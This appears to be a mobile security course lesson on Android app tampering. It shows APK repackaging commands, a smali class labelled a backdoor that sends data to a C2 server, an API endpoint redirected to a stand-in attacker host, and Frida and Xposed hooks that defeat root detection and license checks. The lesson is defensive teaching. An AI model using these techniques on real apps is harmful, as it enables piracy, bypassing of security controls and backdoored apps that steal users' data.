# Module 16: Code Tampering - Techniques

## Overview

This lesson covers the specific techniques attackers use to tamper with mobile apps. Understanding these techniques helps you defend against them.

## Technique 1: APK Repackaging

Repackaging is the most common tampering technique.

### Step-by-Step Process

**Step 1: Obtain the APK**
```
adb shell pm path com.example.app
adb pull /data/app/com.example.app/base.apk
```

**Step 2: Decode with Apktool**
```
apktool d base.apk -o app_decoded
```

**Step 3: Modify the Code**

Edit smali files to change behavior:

```smali
# Original
const/4 v0, 0x0
return v0

# Modified
const/4 v0, 0x1
return v0
```

**Step 4: Rebuild**
```
apktool b app_decoded -o modified.apk
```

**Step 5: Sign with New Key**
```
apksigner sign --ks mykey.keystore modified.apk
```

**Step 6: Install**
```
adb install modified.apk
```

### What Can Be Changed in Repackaging

| Component | What to Change |
|-----------|---------------|
| Smali code | Modify logic, bypass checks |
| AndroidManifest.xml | Change permissions, exported components |
| resources.arsc | Change strings, API endpoints |
| res/values/strings.xml | Change URLs, text |
| res/layout/ | Change UI elements |
| Assets | Replace files, databases |

## Technique 2: Smali Code Injection

Attackers inject new smali code into the app.

**Example: Injecting a backdoor**

Create a new smali file that makes HTTP requests to a C2 server:
```smali
.class public Lcom/example/app/Backdoor;
.super Ljava/lang/Object;
.source "Backdoor.java"

.method public static sendData(Ljava/lang/String;)V
    .registers 4
    .param p0, "data"

    new-instance v0, Ljava/lang/Thread;
    new-instance v1, Lcom/example/app/Backdoor$1;
    invoke-direct {v1, v0}, Lcom/example/app/Backdoor$1;-><init>(Ljava/lang/String;)V
    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
    invoke-virtual {v0}, Ljava/lang/Thread;->start()
    return-void
.end method
```

Then add a call to this method in MainActivity.smali.

## Technique 3: Resource Modification

Attackers modify app resources to change appearance or behavior.

**Changing API endpoints:**
```xml
<!-- Original strings.xml -->
<string name="api_url">https://real-api.example.com</string>

<!-- Modified strings.xml -->
<string name="api_url">https://attacker-api.example.com</string>
```

## Technique 4: Library Hooking (Frida)

Frida can modify app behavior at runtime without modifying the APK.

**Bypassing root detection with Frida:**
```javascript
Java.perform(function() {
    var RootDetection = Java.use('com.example.app.RootDetection');
    RootDetection.isRooted.implementation = function() {
        return false; // Always return "not rooted"
    };
});
```

**Usage:**
```
frida -U -l bypass_root.js com.example.app
```

## Technique 5: Runtime Manipulation (Xposed)

Xposed modules can modify app behavior persistently.

**Xposed module example:**
```java
public class BypassLicense implements IXposedHookLoadPackage {
    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) {
        if (lpparam.packageName.equals("com.example.app")) {
            findAndHookMethod("com.example.app.LicenseChecker",
                lpparam.classLoader,
                "isLicensed",
                new XC_MethodReplacement() {
                    @Override
                    protected Object replaceHookedMethod(
                        MethodHookParam param) {
                        return true; // Always licensed
                    }
                });
        }
    }
}
```

## Technique 6: Debugging and Modification

Using Android Studio debugger or jdb to modify app state at runtime.

## Common Tampering Targets

| Target | Technique |
|--------|-----------|
| License check | Smali modification, Frida hook |
| SSL Pinning | Smali modification, Frida bypass |
| Root detection | Smali modification, Frida hook |
| In-app purchases | Smali modification |
| Ads | Smali modification, host file blocking |
| Premium features | Smali modification |
| API endpoints | Resource modification |

## Summary

Code tampering techniques include APK repackaging, smali injection, resource modification, library hooking (Frida), runtime manipulation (Xposed), and debugging. Attackers can modify license checks, security controls, API endpoints, and app behavior. Understanding these techniques is essential for implementing effective protections.